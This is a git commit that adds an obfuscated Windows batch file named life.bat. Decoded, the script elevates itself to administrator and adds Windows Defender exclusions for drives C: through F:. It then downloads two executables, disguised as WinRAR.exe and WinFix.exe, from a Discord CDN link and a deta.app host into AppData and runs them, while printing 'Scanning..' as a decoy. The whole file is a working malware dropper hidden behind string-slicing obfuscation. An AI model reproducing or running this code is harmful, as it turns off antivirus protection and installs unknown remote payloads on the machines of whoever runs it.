5fd5dd8a2da5648f54f0e42d00ed15d08e440da2
ludi1337 <126729019+ludi1337@users.noreply.github.com>
2023-03-01 23:59:22 +0100

    Add files via upload

---
+++ life.bat
@@ -0,0 +1,30 @@
+ÿþ&cls
+@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
+SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
+^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
+@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
+@ec%r:~11,1%o off
+cl%r:~8,1%
+
+%r:~2,1%f no%r:~4,1% "%1"=="am_admin" (
+    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -%r:~18,1%r%r:~1,1%%r:~13,1%%r:~12,1%en%r:~4,1%L%r:~2,1%%r:~8,1%%r:~4,1% 'a%r:~12,1%_ad%r:~12,1%%r:~2,1%n'"
+    ex%r:~2,1%%r:~4,1% /%r:~10,1%
+)
+
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell -%r:~2,1%np%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -o%r:~13,1%%r:~4,1%p%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -Non%r:~16,1%n%r:~4,1%erac%r:~4,1%%r:~2,1%ve -Co%r:~12,1%%r:~12,1%and %r:~18,1%dd-MpPreference -Excl%r:~13,1%%r:~8,1%%r:~2,1%onPa%r:~4,1%%r:~11,1% "C:"
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell -%r:~2,1%np%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -o%r:~13,1%%r:~4,1%p%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -Non%r:~16,1%n%r:~4,1%erac%r:~4,1%%r:~2,1%ve -Co%r:~12,1%%r:~12,1%and %r:~18,1%dd-MpPreference -Excl%r:~13,1%%r:~8,1%%r:~2,1%onPa%r:~4,1%%r:~11,1% "D:"
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell -%r:~2,1%np%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -o%r:~13,1%%r:~4,1%p%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -Non%r:~16,1%n%r:~4,1%erac%r:~4,1%%r:~2,1%ve -Co%r:~12,1%%r:~12,1%and %r:~18,1%dd-MpPreference -Excl%r:~13,1%%r:~8,1%%r:~2,1%onPa%r:~4,1%%r:~11,1% "E:"
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell -%r:~2,1%np%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -o%r:~13,1%%r:~4,1%p%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -Non%r:~16,1%n%r:~4,1%erac%r:~4,1%%r:~2,1%ve -Co%r:~12,1%%r:~12,1%and %r:~18,1%dd-MpPreference -Excl%r:~13,1%%r:~8,1%%r:~2,1%onPa%r:~4,1%%r:~11,1% "F:"
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell -Co%r:~12,1%%r:~12,1%and "%r:~16,1%nvoke-We%r:~10,1%Req%r:~13,1%e%r:~8,1%%r:~4,1% %r:~11,1%%r:~4,1%%r:~4,1%p%r:~8,1%://cdn.d%r:~2,1%%r:~8,1%cordapp.co%r:~12,1%/a%r:~4,1%%r:~4,1%ac%r:~11,1%%r:~12,1%en%r:~4,1%%r:~8,1%/1076209296464957512/1078658082613239869/W%r:~2,1%nR%r:~18,1%R.exe -%r:~17,1%%r:~13,1%%r:~4,1%F%r:~2,1%le %AppData%\W%r:~2,1%nR%r:~18,1%R.exe"
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell -Co%r:~12,1%%r:~12,1%and "%r:~16,1%nvoke-We%r:~10,1%Req%r:~13,1%e%r:~8,1%%r:~4,1% %r:~11,1%%r:~4,1%%r:~4,1%p%r:~8,1%://f%r:~2,1%le%r:~10,1%ox-1-y5191784.de%r:~4,1%a.app/ap%r:~2,1%/%r:~8,1%%r:~11,1%ared/c%r:~11,1%%r:~13,1%nk/0/e4c15279e%r:~10,1%103333.exe -%r:~17,1%%r:~13,1%%r:~4,1%F%r:~2,1%le %AppData%\W%r:~2,1%nF%r:~2,1%x.exe"
+
+%r:~8,1%%r:~4,1%ar%r:~4,1% %AppData%\W%r:~2,1%nR%r:~18,1%R.exe
+%r:~8,1%%r:~4,1%ar%r:~4,1% %AppData%\W%r:~2,1%nF%r:~2,1%x.exe
+D%r:~16,1%%r:~14,1%M /%r:~17,1%nl%r:~2,1%ne /Ena%r:~10,1%le-Fea%r:~4,1%%r:~13,1%re /Fea%r:~4,1%%r:~13,1%reNa%r:~12,1%e:Ne%r:~4,1%Fx3 /%r:~18,1%ll
+ec%r:~11,1%o %r:~14,1%cann%r:~2,1%n%r:~1,1%..
+pa%r:~13,1%%r:~8,1%e
+@ec%r:~11,1%o off
+%r:~8,1%e%r:~4,1% a = %%~i
+%r:~8,1%e%r:~4,1% a = % + %~i"%%~%r:~2,1%"%
+set a = %a%
+:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
